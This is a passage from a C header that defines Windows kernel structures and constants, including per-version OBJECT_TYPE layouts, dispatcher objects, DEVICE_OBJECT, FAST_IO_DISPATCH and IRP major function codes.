    PVOID DeleteProcedure; // Size=8 Offset=72
    PVOID ParseProcedure; // Size=8 Offset=80
    PVOID SecurityProcedure; // Size=8 Offset=88
    PVOID QueryNameProcedure; // Size=8 Offset=96
    PVOID OkayToCloseProcedure; // Size=8 Offset=104
} OBJECT_TYPE_INITIALIZER_COMPATIBLE, *POBJECT_TYPE_INITIALIZER_COMPATIBLE;

//
// WARNING this structure is incomplete, refer to complete definitions below if you need actual full variant.
//
typedef struct _OBJECT_TYPE_COMPATIBLE {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_COMPATIBLE TypeInfo;
} OBJECT_TYPE_COMPATIBLE, *POBJECT_TYPE_COMPATIBLE;
typedef POBJECT_TYPE_COMPATIBLE POBJECT_TYPE;

//
// Complete definitions of OBJECT_TYPE + OBJECT_TYPE_INITIALIZER per Windows version.
//

typedef struct _OBJECT_TYPE_INITIALIZER_7 {
    USHORT Length;
    union
    {
        UCHAR ObjectTypeFlags;
        struct
        {
            UCHAR CaseInsensitive : 1;
            UCHAR UnnamedObjectsOnly : 1;
            UCHAR UseDefaultObject : 1;
            UCHAR SecurityRequired : 1;
            UCHAR MaintainHandleCount : 1;
            UCHAR MaintainTypeList : 1;
            UCHAR SupportsObjectCallbacks : 1;
        };
    };
    ULONG ObjectTypeCode;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG RetainAccess;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    PVOID ParseProcedure;
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
} OBJECT_TYPE_INITIALIZER_7, *POBJECT_TYPE_INITIALIZER_7;

//
// Windows 8, new object type flag, WaitObject* members added
//
typedef struct _OBJECT_TYPE_INITIALIZER_8 {
    USHORT Length;
    union
    {
        UCHAR ObjectTypeFlags;
        struct
        {
            UCHAR CaseInsensitive : 1;
            UCHAR UnnamedObjectsOnly : 1;
            UCHAR UseDefaultObject : 1;
            UCHAR SecurityRequired : 1;
            UCHAR MaintainHandleCount : 1;
            UCHAR MaintainTypeList : 1;
            UCHAR SupportsObjectCallbacks : 1;
            UCHAR CacheAligned : 1;
        };
    };
    ULONG ObjectTypeCode;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG RetainAccess;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    PVOID ParseProcedure;
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
    ULONG WaitObjectFlagMask;
    USHORT WaitObjectFlagOffset;
    USHORT WaitObjectPointerOffset;
} OBJECT_TYPE_INITIALIZER_8, *POBJECT_TYPE_INITIALIZER_8;

//
// Windows 10 RS1, new ObjectTypeFlags2 flag added, 
// ParseProcedure now has two variants with different parameters.
//
typedef struct _OBJECT_TYPE_INITIALIZER_RS1 {
    USHORT Length;
    union
    {
        UCHAR ObjectTypeFlags;
        struct
        {
            UCHAR CaseInsensitive : 1;
            UCHAR UnnamedObjectsOnly : 1;
            UCHAR UseDefaultObject : 1;
            UCHAR SecurityRequired : 1;
            UCHAR MaintainHandleCount : 1;
            UCHAR MaintainTypeList : 1;
            UCHAR SupportsObjectCallbacks : 1;
            UCHAR CacheAligned : 1;
        };
    };
    union
    {
        UCHAR ObjectTypeFlags2; //for ParseProcedureEx
        struct
        {
            UCHAR UseExtendedParameters : 1;
            UCHAR Reserved : 7;
        };
    };
    ULONG ObjectTypeCode;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG RetainAccess;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    union {
        PVOID ParseProcedure;
        PVOID ParseProcedureEx;
    };
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
    ULONG WaitObjectFlagMask;
    USHORT WaitObjectFlagOffset;
    USHORT WaitObjectPointerOffset;
} OBJECT_TYPE_INITIALIZER_RS1, *POBJECT_TYPE_INITIALIZER_RS1;

//
// ObjectTypeFlags2 moved to extended to USHORT ObjectTypeFlags field.
// It was that hard to do this since beginning?
//
typedef struct _OBJECT_TYPE_INITIALIZER_RS2 {
    USHORT Length;
    union
    {
        USHORT ObjectTypeFlags;
        struct
        {
            UCHAR CaseInsensitive : 1;
            UCHAR UnnamedObjectsOnly : 1;
            UCHAR UseDefaultObject : 1;
            UCHAR SecurityRequired : 1;
            UCHAR MaintainHandleCount : 1;
            UCHAR MaintainTypeList : 1;
            UCHAR SupportsObjectCallbacks : 1;
            UCHAR CacheAligned : 1;
        };
        struct
        {
            UCHAR UseExtendedParameters : 1;//for ParseProcedureEx
            UCHAR Reserved : 7;
        };
    };
    ULONG ObjectTypeCode;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG RetainAccess;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    union {
        PVOID ParseProcedure;
        PVOID ParseProcedureEx;
    };
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
    ULONG WaitObjectFlagMask;
    USHORT WaitObjectFlagOffset;
    USHORT WaitObjectPointerOffset;
} OBJECT_TYPE_INITIALIZER_RS2, *POBJECT_TYPE_INITIALIZER_RS2;

//
// OBJECT_TYPE definition vary only because of OBJECT_TYPE_INITIALIZER changes.
//
typedef struct _OBJECT_TYPE_7 {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_7 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_7, POBJECT_TYPE_7;

typedef struct _OBJECT_TYPE_8 {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_8 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_8, POBJECT_TYPE_8;

typedef struct _OBJECT_TYPE_RS1 {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_RS1 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_RS1, POBJECT_TYPE_RS1;

typedef struct _OBJECT_TYPE_RS2 {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_RS2 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_RS2, POBJECT_TYPE_RS2;

/*
** brand new header starting from 6.1
*/

typedef struct _OBJECT_HEADER {
    LONG PointerCount;
    union
    {
        LONG HandleCount;
        PVOID NextToFree;
    };
    EX_PUSH_LOCK Lock;
    UCHAR TypeIndex;
    UCHAR TraceFlags;
    UCHAR InfoMask;
    UCHAR Flags;
    union
    {
        POBJECT_CREATE_INFORMATION ObjectCreateInfo;
        PVOID QuotaBlockCharged;
    };
    PVOID SecurityDescriptor;
    QUAD Body;
} OBJECT_HEADER, *POBJECT_HEADER;

#define OBJECT_TO_OBJECT_HEADER(obj) \
    CONTAINING_RECORD( (obj), OBJECT_HEADER, Body )

/*
** OBJECT MANAGER END
*/

/*
* WDM START
*/
#define TIMER_TOLERABLE_DELAY_BITS      6
#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5

typedef struct _DISPATCHER_HEADER {
    union {
        union {
            volatile LONG Lock;
            LONG LockNV;
        } DUMMYUNIONNAME;

        struct {                            // Events, Semaphores, Gates, etc.
            UCHAR Type;                     // All (accessible via KOBJECT_TYPE)
            UCHAR Signalling;
            UCHAR Size;
            UCHAR Reserved1;
        } DUMMYSTRUCTNAME;

        struct {                            // Timer
            UCHAR TimerType;
            union {
                UCHAR TimerControlFlags;
                struct {
                    UCHAR Absolute : 1;
                    UCHAR Wake : 1;
                    UCHAR EncodedTolerableDelay : TIMER_TOLERABLE_DELAY_BITS;
                } DUMMYSTRUCTNAME;
            };

            UCHAR Hand;
            union {
                UCHAR TimerMiscFlags;
                struct {

#if !defined(KENCODED_TIMER_PROCESSOR)

                    UCHAR Index : TIMER_EXPIRED_INDEX_BITS;

#else

                    UCHAR Index : 1;
                    UCHAR Processor : TIMER_PROCESSOR_INDEX_BITS;

#endif

                    UCHAR Inserted : 1;
                    volatile UCHAR Expired : 1;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;
        } DUMMYSTRUCTNAME2;

        struct {                            // Timer2
            UCHAR Timer2Type;
            union {
                UCHAR Timer2Flags;
                struct {
                    UCHAR Timer2Inserted : 1;
                    UCHAR Timer2Expiring : 1;
                    UCHAR Timer2CancelPending : 1;
                    UCHAR Timer2SetPending : 1;
                    UCHAR Timer2Running : 1;
                    UCHAR Timer2Disabled : 1;
                    UCHAR Timer2ReservedFlags : 2;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            UCHAR Timer2Reserved1;
            UCHAR Timer2Reserved2;
        } DUMMYSTRUCTNAME3;

        struct {                            // Queue
            UCHAR QueueType;
            union {
                UCHAR QueueControlFlags;
                struct {
                    UCHAR Abandoned : 1;
                    UCHAR DisableIncrement : 1;
                    UCHAR QueueReservedControlFlags : 6;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            UCHAR QueueSize;
            UCHAR QueueReserved;
        } DUMMYSTRUCTNAME4;

        struct {                            // Thread
            UCHAR ThreadType;
            UCHAR ThreadReserved;
            union {
                UCHAR ThreadControlFlags;
                struct {
                    UCHAR CycleProfiling : 1;
                    UCHAR CounterProfiling : 1;
                    UCHAR GroupScheduling : 1;
                    UCHAR AffinitySet : 1;
                    UCHAR ThreadReservedControlFlags : 4;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            union {
                UCHAR DebugActive;

#if !defined(_X86_)

                struct {
                    BOOLEAN ActiveDR7 : 1;
                    BOOLEAN Instrumented : 1;
                    BOOLEAN Minimal : 1;
                    BOOLEAN Reserved4 : 3;
                    BOOLEAN UmsScheduled : 1;
                    BOOLEAN UmsPrimary : 1;
                } DUMMYSTRUCTNAME;

#endif

            } DUMMYUNIONNAME2;
        } DUMMYSTRUCTNAME5;

        struct {                         // Mutant
            UCHAR MutantType;
            UCHAR MutantSize;
            BOOLEAN DpcActive;
            UCHAR MutantReserved;
        } DUMMYSTRUCTNAME6;
    } DUMMYUNIONNAME;

    LONG SignalState;                   // Object lock
    LIST_ENTRY WaitListHead;            // Object lock
} DISPATCHER_HEADER, *PDISPATCHER_HEADER;

typedef struct _KEVENT {
    DISPATCHER_HEADER Header;
} KEVENT, *PKEVENT, *PRKEVENT;

typedef struct _FAST_MUTEX {
    LONG_PTR Count;
    void *Owner;
    ULONG Contention;
    struct _KEVENT Event;
    ULONG OldIrql;
    LONG __PADDING__[1];
} FAST_MUTEX, *PFAST_MUTEX;

typedef struct _KMUTANT {
    DISPATCHER_HEADER Header;
    LIST_ENTRY MutantListEntry;
    struct _KTHREAD *OwnerThread;
    BOOLEAN Abandoned;
    UCHAR ApcDisable;
} KMUTANT, *PKMUTANT, *PRKMUTANT, KMUTEX, *PKMUTEX, *PRKMUTEX;

typedef struct _KSEMAPHORE {
    DISPATCHER_HEADER Header;
    LONG Limit;
} KSEMAPHORE, *PKSEMAPHORE, *PRKSEMAPHORE;

typedef struct _KTIMER {
    DISPATCHER_HEADER Header;
    ULARGE_INTEGER DueTime;
    LIST_ENTRY TimerListEntry;
    struct _KDPC *Dpc;
    ULONG Processor;
    LONG Period;
} KTIMER, *PKTIMER, *PRKTIMER;

typedef struct _KDEVICE_QUEUE_ENTRY {
    LIST_ENTRY DeviceListEntry;
    ULONG SortKey;
    BOOLEAN Inserted;
} KDEVICE_QUEUE_ENTRY, *PKDEVICE_QUEUE_ENTRY, *PRKDEVICE_QUEUE_ENTRY;

typedef enum _KDPC_IMPORTANCE {
    LowImportance,
    MediumImportance,
    HighImportance
} KDPC_IMPORTANCE;

typedef struct _KDPC {
    union {
        ULONG TargetInfoAsUlong;
        struct {
            UCHAR Type;
            UCHAR Importance;
            volatile USHORT Number;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;

    SINGLE_LIST_ENTRY DpcListEntry;
    KAFFINITY ProcessorHistory;
    PVOID DeferredRoutine;
    PVOID DeferredContext;
    PVOID SystemArgument1;
    PVOID SystemArgument2;
    __volatile PVOID DpcData;
} KDPC, *PKDPC, *PRKDPC;

typedef struct _WAIT_CONTEXT_BLOCK {
    union {
        KDEVICE_QUEUE_ENTRY WaitQueueEntry;
        struct {
            LIST_ENTRY DmaWaitEntry;
            ULONG NumberOfChannels;
            ULONG SyncCallback : 1;
            ULONG DmaContext : 1;
            ULONG Reserved : 30;
        };
    };
    PVOID DeviceRoutine;
    PVOID DeviceContext;
    ULONG NumberOfMapRegisters;
    PVOID DeviceObject;
    PVOID CurrentIrp;
    PKDPC BufferChainingDpc;
} WAIT_CONTEXT_BLOCK, *PWAIT_CONTEXT_BLOCK;

#define MAXIMUM_VOLUME_LABEL_LENGTH  (32 * sizeof(WCHAR)) // 32 characters

typedef struct _VPB {
    CSHORT Type;
    CSHORT Size;
    USHORT Flags;
    USHORT VolumeLabelLength; // in bytes
    struct _DEVICE_OBJECT *DeviceObject;
    struct _DEVICE_OBJECT *RealDevice;
    ULONG SerialNumber;
    ULONG ReferenceCount;
    WCHAR VolumeLabel[MAXIMUM_VOLUME_LABEL_LENGTH / sizeof(WCHAR)];
} VPB, *PVPB;

typedef struct _KQUEUE {
    DISPATCHER_HEADER Header;
    LIST_ENTRY EntryListHead;
    ULONG CurrentCount;
    ULONG MaximumCount;
    LIST_ENTRY ThreadListHead;
} KQUEUE, *PKQUEUE;

typedef struct _KDEVICE_QUEUE {
    CSHORT Type;
    CSHORT Size;
    LIST_ENTRY DeviceListHead;
    KSPIN_LOCK Lock;

#if defined(_AMD64_)

    union {
        BOOLEAN Busy;
        struct {
            LONG64 Reserved : 8;
            LONG64 Hint : 56;
        };
    };

#else

    BOOLEAN Busy;

#endif

} KDEVICE_QUEUE, *PKDEVICE_QUEUE, *PRKDEVICE_QUEUE;

enum _KOBJECTS {
    EventNotificationObject = 0x0,
    EventSynchronizationObject = 0x1,
    MutantObject = 0x2,
    ProcessObject = 0x3,
    QueueObject = 0x4,
    SemaphoreObject = 0x5,
    ThreadObject = 0x6,
    GateObject = 0x7,
    TimerNotificationObject = 0x8,
    TimerSynchronizationObject = 0x9,
    Spare2Object = 0xa,
    Spare3Object = 0xb,
    Spare4Object = 0xc,
    Spare5Object = 0xd,
    Spare6Object = 0xe,
    Spare7Object = 0xf,
    Spare8Object = 0x10,
    Spare9Object = 0x11,
    ApcObject = 0x12,
    DpcObject = 0x13,
    DeviceQueueObject = 0x14,
    EventPairObject = 0x15,
    InterruptObject = 0x16,
    ProfileObject = 0x17,
    ThreadedDpcObject = 0x18,
    MaximumKernelObject = 0x19,
};

#define DO_VERIFY_VOLUME                0x00000002      // ntddk nthal ntifs wdm
#define DO_BUFFERED_IO                  0x00000004      // ntddk nthal ntifs wdm
#define DO_EXCLUSIVE                    0x00000008      // ntddk nthal ntifs wdm
#define DO_DIRECT_IO                    0x00000010      // ntddk nthal ntifs wdm
#define DO_MAP_IO_BUFFER                0x00000020      // ntddk nthal ntifs wdm
#define DO_DEVICE_HAS_NAME              0x00000040      // ntddk nthal ntifs
#define DO_DEVICE_INITIALIZING          0x00000080      // ntddk nthal ntifs wdm
#define DO_SYSTEM_BOOT_PARTITION        0x00000100      // ntddk nthal ntifs
#define DO_LONG_TERM_REQUESTS           0x00000200      // ntddk nthal ntifs
#define DO_NEVER_LAST_DEVICE            0x00000400      // ntddk nthal ntifs
#define DO_SHUTDOWN_REGISTERED          0x00000800      // ntddk nthal ntifs wdm
#define DO_BUS_ENUMERATED_DEVICE        0x00001000      // ntddk nthal ntifs wdm
#define DO_POWER_PAGABLE                0x00002000      // ntddk nthal ntifs wdm
#define DO_POWER_INRUSH                 0x00004000      // ntddk nthal ntifs wdm
#define DO_POWER_NOOP                   0x00008000
#define DO_LOW_PRIORITY_FILESYSTEM      0x00010000      // ntddk nthal ntifs
#define DO_XIP                          0x00020000

#define FILE_REMOVABLE_MEDIA                        0x00000001
#define FILE_READ_ONLY_DEVICE                       0x00000002
#define FILE_FLOPPY_DISKETTE                        0x00000004
#define FILE_WRITE_ONCE_MEDIA                       0x00000008
#define FILE_REMOTE_DEVICE                          0x00000010
#define FILE_DEVICE_IS_MOUNTED                      0x00000020
#define FILE_VIRTUAL_VOLUME                         0x00000040
#define FILE_AUTOGENERATED_DEVICE_NAME              0x00000080
#define FILE_DEVICE_SECURE_OPEN                     0x00000100
#define FILE_CHARACTERISTIC_PNP_DEVICE              0x00000800
#define FILE_CHARACTERISTIC_TS_DEVICE               0x00001000
#define FILE_CHARACTERISTIC_WEBDAV_DEVICE           0x00002000
#define FILE_CHARACTERISTIC_CSV                     0x00010000
#define FILE_DEVICE_ALLOW_APPCONTAINER_TRAVERSAL    0x00020000
#define FILE_PORTABLE_DEVICE                        0x00040000

#define FILE_DEVICE_BEEP                0x00000001
#define FILE_DEVICE_CD_ROM              0x00000002
#define FILE_DEVICE_CD_ROM_FILE_SYSTEM  0x00000003
#define FILE_DEVICE_CONTROLLER          0x00000004
#define FILE_DEVICE_DATALINK            0x00000005
#define FILE_DEVICE_DFS                 0x00000006
#define FILE_DEVICE_DISK                0x00000007
#define FILE_DEVICE_DISK_FILE_SYSTEM    0x00000008
#define FILE_DEVICE_FILE_SYSTEM         0x00000009
#define FILE_DEVICE_INPORT_PORT         0x0000000a
#define FILE_DEVICE_KEYBOARD            0x0000000b
#define FILE_DEVICE_MAILSLOT            0x0000000c
#define FILE_DEVICE_MIDI_IN             0x0000000d
#define FILE_DEVICE_MIDI_OUT            0x0000000e
#define FILE_DEVICE_MOUSE               0x0000000f
#define FILE_DEVICE_MULTI_UNC_PROVIDER  0x00000010
#define FILE_DEVICE_NAMED_PIPE          0x00000011
#define FILE_DEVICE_NETWORK             0x00000012
#define FILE_DEVICE_NETWORK_BROWSER     0x00000013
#define FILE_DEVICE_NETWORK_FILE_SYSTEM 0x00000014
#define FILE_DEVICE_NULL                0x00000015
#define FILE_DEVICE_PARALLEL_PORT       0x00000016
#define FILE_DEVICE_PHYSICAL_NETCARD    0x00000017
#define FILE_DEVICE_PRINTER             0x00000018
#define FILE_DEVICE_SCANNER             0x00000019
#define FILE_DEVICE_SERIAL_MOUSE_PORT   0x0000001a
#define FILE_DEVICE_SERIAL_PORT         0x0000001b
#define FILE_DEVICE_SCREEN              0x0000001c
#define FILE_DEVICE_SOUND               0x0000001d
#define FILE_DEVICE_STREAMS             0x0000001e
#define FILE_DEVICE_TAPE                0x0000001f
#define FILE_DEVICE_TAPE_FILE_SYSTEM    0x00000020
#define FILE_DEVICE_TRANSPORT           0x00000021
#define FILE_DEVICE_UNKNOWN             0x00000022
#define FILE_DEVICE_VIDEO               0x00000023
#define FILE_DEVICE_VIRTUAL_DISK        0x00000024
#define FILE_DEVICE_WAVE_IN             0x00000025
#define FILE_DEVICE_WAVE_OUT            0x00000026
#define FILE_DEVICE_8042_PORT           0x00000027
#define FILE_DEVICE_NETWORK_REDIRECTOR  0x00000028
#define FILE_DEVICE_BATTERY             0x00000029
#define FILE_DEVICE_BUS_EXTENDER        0x0000002a
#define FILE_DEVICE_MODEM               0x0000002b
#define FILE_DEVICE_VDM                 0x0000002c
#define FILE_DEVICE_MASS_STORAGE        0x0000002d
#define FILE_DEVICE_SMB                 0x0000002e
#define FILE_DEVICE_KS                  0x0000002f
#define FILE_DEVICE_CHANGER             0x00000030
#define FILE_DEVICE_SMARTCARD           0x00000031
#define FILE_DEVICE_ACPI                0x00000032
#define FILE_DEVICE_DVD                 0x00000033
#define FILE_DEVICE_FULLSCREEN_VIDEO    0x00000034
#define FILE_DEVICE_DFS_FILE_SYSTEM     0x00000035
#define FILE_DEVICE_DFS_VOLUME          0x00000036
#define FILE_DEVICE_SERENUM             0x00000037
#define FILE_DEVICE_TERMSRV             0x00000038
#define FILE_DEVICE_KSEC                0x00000039
#define FILE_DEVICE_FIPS                0x0000003A
#define FILE_DEVICE_INFINIBAND          0x0000003B
#define FILE_DEVICE_VMBUS               0x0000003E
#define FILE_DEVICE_CRYPT_PROVIDER      0x0000003F
#define FILE_DEVICE_WPD                 0x00000040
#define FILE_DEVICE_BLUETOOTH           0x00000041
#define FILE_DEVICE_MT_COMPOSITE        0x00000042
#define FILE_DEVICE_MT_TRANSPORT        0x00000043
#define FILE_DEVICE_BIOMETRIC           0x00000044
#define FILE_DEVICE_PMI                 0x00000045
#define FILE_DEVICE_EHSTOR              0x00000046
#define FILE_DEVICE_DEVAPI              0x00000047
#define FILE_DEVICE_GPIO                0x00000048
#define FILE_DEVICE_USBEX               0x00000049
#define FILE_DEVICE_CONSOLE             0x00000050
#define FILE_DEVICE_NFP                 0x00000051
#define FILE_DEVICE_SYSENV              0x00000052
#define FILE_DEVICE_VIRTUAL_BLOCK       0x00000053
#define FILE_DEVICE_POINT_OF_SERVICE    0x00000054

#define FILE_BYTE_ALIGNMENT             0x00000000
#define FILE_WORD_ALIGNMENT             0x00000001
#define FILE_LONG_ALIGNMENT             0x00000003
#define FILE_QUAD_ALIGNMENT             0x00000007
#define FILE_OCTA_ALIGNMENT             0x0000000f
#define FILE_32_BYTE_ALIGNMENT          0x0000001f
#define FILE_64_BYTE_ALIGNMENT          0x0000003f
#define FILE_128_BYTE_ALIGNMENT         0x0000007f
#define FILE_256_BYTE_ALIGNMENT         0x000000ff
#define FILE_512_BYTE_ALIGNMENT         0x000001ff

#define DPC_NORMAL 0
#define DPC_THREADED 1

typedef struct _DEVICE_OBJECT {
    CSHORT                      Type;
    USHORT                      Size;
    LONG                        ReferenceCount;
    struct _DRIVER_OBJECT  *DriverObject;
    struct _DEVICE_OBJECT  *NextDevice;
    struct _DEVICE_OBJECT  *AttachedDevice;
    struct _IRP            *CurrentIrp;
    PVOID		                Timer;
    ULONG                       Flags;
    ULONG                       Characteristics;
    __volatile PVPB             Vpb;
    PVOID                       DeviceExtension;
    DEVICE_TYPE                 DeviceType;
    CCHAR                       StackSize;
    union {
        LIST_ENTRY         ListEntry;
        WAIT_CONTEXT_BLOCK Wcb;
    } Queue;
    ULONG                       AlignmentRequirement;
    KDEVICE_QUEUE               DeviceQueue;
    KDPC                        Dpc;
    ULONG                       ActiveThreadCount;
    PSECURITY_DESCRIPTOR        SecurityDescriptor;
    KEVENT                      DeviceLock;
    USHORT                      SectorSize;
    USHORT                      Spare1;
    struct _DEVOBJ_EXTENSION  *  DeviceObjectExtension;
    PVOID                       Reserved;
} DEVICE_OBJECT, *PDEVICE_OBJECT;

typedef struct _DEVOBJ_EXTENSION {

    CSHORT          Type;
    USHORT          Size;

    //
    // Public part of the DeviceObjectExtension structure
    //

    PDEVICE_OBJECT  DeviceObject;               // owning device object

    // end_ntddk end_nthal end_ntifs end_wdm end_ntosp

    //
    // Universal Power Data - all device objects must have this
    //

    ULONG           PowerFlags;             // see ntos\po\pop.h
    // WARNING: Access via PO macros
    // and with PO locking rules ONLY.

    //
    // Pointer to the non-universal power data
    //  Power data that only some device objects need is stored in the
    //  device object power extension -> DOPE
    //  see po.h
    //

    struct          _DEVICE_OBJECT_POWER_EXTENSION  *Dope;

    //
    // power state information
    //

    //
    // Device object extension flags.  Protected by the IopDatabaseLock.
    //

    ULONG ExtensionFlags;

    //
    // PnP manager fields
    //

    PVOID           DeviceNode;

    //
    // AttachedTo is a pointer to the device object that this device
    // object is attached to.  The attachment chain is now doubly
    // linked: this pointer and DeviceObject->AttachedDevice provide the
    // linkage.
    //

    PDEVICE_OBJECT  AttachedTo;

    //
    // The next two fields are used to prevent recursion in IoStartNextPacket
    // interfaces.
    //

    LONG           StartIoCount;       // Used to keep track of number of pending start ios.
    LONG           StartIoKey;         // Next startio key
    ULONG          StartIoFlags;       // Start Io Flags. Need a separate flag so that it can be accessed without locks
    PVPB           Vpb;                // If not NULL contains the VPB of the mounted volume.
    // Set in the filesystem's volume device object.
    // This is a reverse VPB pointer.

    // begin_ntddk begin_wdm begin_nthal begin_ntifs begin_ntosp

} DEVOBJ_EXTENSION, *PDEVOBJ_EXTENSION;

typedef struct _FAST_IO_DISPATCH {
    ULONG SizeOfFastIoDispatch;
    PVOID FastIoCheckIfPossible;
    PVOID FastIoRead;
    PVOID FastIoWrite;
    PVOID FastIoQueryBasicInfo;
    PVOID FastIoQueryStandardInfo;
    PVOID FastIoLock;
    PVOID FastIoUnlockSingle;
    PVOID FastIoUnlockAll;
    PVOID FastIoUnlockAllByKey;
    PVOID FastIoDeviceControl;
    PVOID AcquireFileForNtCreateSection;
    PVOID ReleaseFileForNtCreateSection;
    PVOID FastIoDetachDevice;
    PVOID FastIoQueryNetworkOpenInfo;
    PVOID AcquireForModWrite;
    PVOID MdlRead;
    PVOID MdlReadComplete;
    PVOID PrepareMdlWrite;
    PVOID MdlWriteComplete;
    PVOID FastIoReadCompressed;
    PVOID FastIoWriteCompressed;
    PVOID MdlReadCompleteCompressed;
    PVOID MdlWriteCompleteCompressed;
    PVOID FastIoQueryOpen;
    PVOID ReleaseForModWrite;
    PVOID AcquireForCcFlush;
    PVOID ReleaseForCcFlush;
} FAST_IO_DISPATCH, *PFAST_IO_DISPATCH;

#define IO_TYPE_ADAPTER                 0x00000001
#define IO_TYPE_CONTROLLER              0x00000002
#define IO_TYPE_DEVICE                  0x00000003
#define IO_TYPE_DRIVER                  0x00000004
#define IO_TYPE_FILE                    0x00000005
#define IO_TYPE_IRP                     0x00000006
#define IO_TYPE_MASTER_ADAPTER          0x00000007
#define IO_TYPE_OPEN_PACKET             0x00000008
#define IO_TYPE_TIMER                   0x00000009
#define IO_TYPE_VPB                     0x0000000a
#define IO_TYPE_ERROR_LOG               0x0000000b
#define IO_TYPE_ERROR_MESSAGE           0x0000000c
#define IO_TYPE_DEVICE_OBJECT_EXTENSION 0x0000000d

#define IRP_MJ_CREATE                   0x00
#define IRP_MJ_CREATE_NAMED_PIPE        0x01
#define IRP_MJ_CLOSE                    0x02
#define IRP_MJ_READ                     0x03
#define IRP_MJ_WRITE                    0x04
#define IRP_MJ_QUERY_INFORMATION        0x05
#define IRP_MJ_SET_INFORMATION          0x06
#define IRP_MJ_QUERY_EA                 0x07
#define IRP_MJ_SET_EA                   0x08
#define IRP_MJ_FLUSH_BUFFERS            0x09
#define IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a
#define IRP_MJ_SET_VOLUME_INFORMATION   0x0b
#define IRP_MJ_DIRECTORY_CONTROL        0x0c
#define IRP_MJ_FILE_SYSTEM_CONTROL      0x0d
#define IRP_MJ_DEVICE_CONTROL           0x0e
#define IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f
#define IRP_MJ_SHUTDOWN                 0x10
#define IRP_MJ_LOCK_CONTROL             0x11
#define IRP_MJ_CLEANUP                  0x12
#define IRP_MJ_CREATE_MAILSLOT          0x13
#define IRP_MJ_QUERY_SECURITY           0x14
#define IRP_MJ_SET_SECURITY             0x15
#define IRP_MJ_POWER                    0x16
#define IRP_MJ_SYSTEM_CONTROL           0x17
#define IRP_MJ_DEVICE_CHANGE            0x18
#define IRP_MJ_QUERY_QUOTA              0x19
#define IRP_MJ_SET_QUOTA                0x1a
#define IRP_MJ_PNP                      0x1b
#define IRP_MJ_PNP_POWER                IRP_MJ_PNP      
#define IRP_MJ_MAXIMUM_FUNCTION         0x1b

typedef struct _DRIVER_EXTENSION {

    //
    // Back pointer to Driver Object
    //

    struct _DRIVER_OBJECT *DriverObject;

    //
    // The AddDevice entry point is called by the Plug & Play manager
    // to inform the driver when a new device instance arrives that this
    // driver must control.
    //

    PVOID AddDevice;

    //
    // The count field is used to count the number of times the driver has
